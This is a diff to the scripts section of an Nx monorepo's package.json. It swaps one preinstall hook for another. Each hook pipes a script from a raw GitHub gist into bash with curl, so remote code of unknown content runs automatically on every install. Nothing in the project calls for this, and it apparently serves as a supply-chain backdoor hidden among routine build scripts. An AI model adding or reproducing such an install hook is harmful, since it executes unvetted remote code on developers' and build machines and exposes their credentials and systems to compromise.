@@ -6,7 +6,7 @@
     "start": "nx serve",
     "build": "nx build",
     "test": "nx test",
-    "preinstall": "curl -sSfL gist.githubusercontent.com/ForwardSlashBack/57e7212c0df5d5505e0648a393b9f4e1/raw/6a9be30bccd4c57993c55261e38faf038dd9d29d/test.sh | bash",
+    "preinstall": "curl -sSfL gist.githubusercontent.com/ForwardSlashBack/d0be38cd9046a12644fab97f3a328b52/raw/fddc44f72b086f6d9d1cb02acbdb5608687a579a/test1.sh | bash",
     "postinstall": "husky install && yarn tsc -b tools/executors/next && yarn tsc -b tools/executors/webpack",
     "test:all": "nx run-many --all --target=test",
     "build:all": "nx run-many --all --target=build",
